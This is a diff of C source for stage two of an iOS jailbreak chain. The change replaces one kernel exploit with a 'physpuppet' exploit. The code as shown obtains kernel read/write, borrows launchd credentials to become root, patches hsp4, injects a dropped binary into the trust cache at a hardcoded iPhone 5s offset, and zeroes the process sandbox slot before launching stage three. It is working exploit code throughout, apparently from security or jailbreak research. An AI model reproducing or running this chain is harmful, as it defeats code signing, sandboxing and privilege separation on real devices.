@@ -3,48 +3,41 @@
 #include <stdlib.h>
 #include <dlfcn.h>
 #include <mach/mach.h>
-#include "common.h"
-#include "time_saved/time_saved.h"
-#include <asl.h>
 #include <CoreFoundation/CoreFoundation.h>
 #include <CommonCrypto/CommonDigest.h>
 #include <sys/stat.h>
 #include <mach-o/loader.h>
 #include <mach-o/fat.h>
 #include <spawn.h>
+#include <inttypes.h>
+
+#include "common.h"
 #include "stage3.h"
 #include "trustcache.h"
 #include "hsp4.h"
 #include "kutils.h"
-#include <inttypes.h>
+#include "log.h"
+#include "physpuppet/exploit.h"
+#include "physpuppet/libprejailbreak.h"
+#include "physpuppet/offsets.h"
+#include "physpuppet/utils.h"
+#include "physpuppet/tfp0.h"
+
+extern mach_port_t tfp0;
 
 char stage3_path[1024];
 
-extern mach_port_t tfpzero;
-extern uint64_t kernel_slide;
-
-extern uint64_t self_struct_proc;
-extern uint64_t kern_struct_proc;
-extern uint64_t launchd_struct_proc;
-
 int launch_stage3(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
-    pid_t pd;
+    pid_t spawned_pid;
     const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
     
-    int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
+    int rv = posix_spawn(&spawned_pid, binary, NULL, NULL, (char **)&args, env);
 
-    uint64_t spawnedProc = proc_of_pid(pd);
+    uint64_t spawned_ucred = borrow_ucreds(spawned_pid, 1);
 
-    //borrow launchd ucred
-    uint64_t launchd_ucred = rk64(launchd_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
-    uint64_t spawned_ucred = rk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
-    wk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED), launchd_ucred);
+    while (access("/tmp/stage3_got_hsp4", F_OK) != 0) {usleep(100000u);};
 
-    
-    while (access("/tmp/stage3_got_hsp4", F_OK) != 0) {usleep(100000u);}; //wait until stage3 get hsp4
-
-    //restore
-    wk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED), spawned_ucred);
+    unborrow_ucreds(spawned_pid, spawned_ucred);
 
     if (rv) return rv;
     
@@ -54,7 +47,7 @@ int launch_stage3(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, 
 int extract_stage3(void) {
   memset(stage3_path, 0, 1024);
   strcpy(stage3_path, "/var/containers/Bundle/stage3");
-  remove(stage3_path);
+  unlink(stage3_path);
 
   FILE *f = fopen(stage3_path, "wb");
 
@@ -62,62 +55,52 @@ int extract_stage3(void) {
   fwrite(stage3, 1, total_size, f);
 
   fclose(f);
-  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] Wrote stage3 (%zu bytes), stage3_path = %s", total_size, stage3_path);
+  LOG("Wrote stage3 (%zu bytes), stage3_path = %s", total_size, stage3_path);
 
   return 0;
 }
 
 int main() {
-  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] loaded");
+  LOG("[stage2] loaded");
 
-  int tfpzero = start_time_saved();
-  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] tfp0 = 0x%x, kslide: 0x%llx, kern_struct_task: 0x%llx", tfpzero, kernel_slide, kern_struct_task);
+  kernel_rw_init();
+  tfp0_init();
 
-  //platformize
-  set_csflags(self_struct_proc);
-  set_tfplatform(self_struct_proc);
+  uint64_t self_ucred = borrow_ucreds(getpid(), 1);
 
-  //borrow launchd ucred
-  uint64_t launchd_ucred = rk64(launchd_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
-  uint64_t self_ucred = rk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
-  wk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), launchd_ucred);
+  setuid(0); setuid(0);
 
-  //elevate
-  setuid(0);
-  setuid(0);
+  patch_hsp4();
 
-  //hsp4 patch
-  setHSP4();
-
-  //prepare stage3
+  // prepare stage3
   extract_stage3();
-  int tc_ret = injectTrustCache(stage3_path, (kernel_slide + koffset(KOFFSET_TRUSTCACHE)));
-  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] injectTrustCache ret = 0x%x", tc_ret);
+  int tc_ret = inject_trustcache(stage3_path, (kinfo(slide) + 0xfffffff008930e80)); // XXX HARDCODED offsets; 5s 12.5.7 
+  LOG("inject_trustcache ret = %d", tc_ret);
   chmod(stage3_path, 0755);
   
-  //restore ucred
-  wk64(self_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED), self_ucred);
+  unborrow_ucreds(getpid(), self_ucred);
 
-  //unsandbox
-  uint64_t saved_sb = rk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT));
-  wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), 0);
+  // unsandbox
+  uint32_t off_sandbox_slot = 0x10;
+  uint64_t saved_sb = kread64(kread64(self_ucred+koffsetof(ucred, label)) + off_sandbox_slot);
+  kwrite64(kread64(self_ucred+koffsetof(ucred, label)) + off_sandbox_slot, 0);
 
   char kernel_base_str[19];
   memset(kernel_base_str, 0, 19);
-  snprintf(kernel_base_str, sizeof(kernel_base_str), "0x%016" PRIx64, kernel_base);
+  snprintf(kernel_base_str, sizeof(kernel_base_str), "0x%016" PRIx64, (0xFFFFFFF007004000 + kinfo(slide)));
 
   char kern_proc_str[19];
   memset(kern_proc_str, 0, 19);
-  snprintf(kern_proc_str, sizeof(kern_proc_str), "0x%016" PRIx64, kern_struct_proc);
+  snprintf(kern_proc_str, sizeof(kern_proc_str), "0x%016" PRIx64, kinfo(proc));
 
   char trustcache_str[19];
   memset(trustcache_str, 0, 19);
-  snprintf(trustcache_str, sizeof(trustcache_str), "0x%016" PRIx64, kernel_slide + koffset(KOFFSET_TRUSTCACHE));
+  snprintf(trustcache_str, sizeof(trustcache_str), "0x%016" PRIx64, 0xfffffff008930e80 + kinfo(slide)); // XXX HARDCODED offsets; 5s 12.5.7 
 
   launch_stage3(stage3_path, kernel_base_str, kern_proc_str, trustcache_str, NULL, NULL, NULL, NULL);
 
   //restore sandbox
-  wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), saved_sb);
+  kwrite64(kread64(self_ucred+koffsetof(ucred, label)) + off_sandbox_slot, saved_sb);
 
   while(1) {};
 
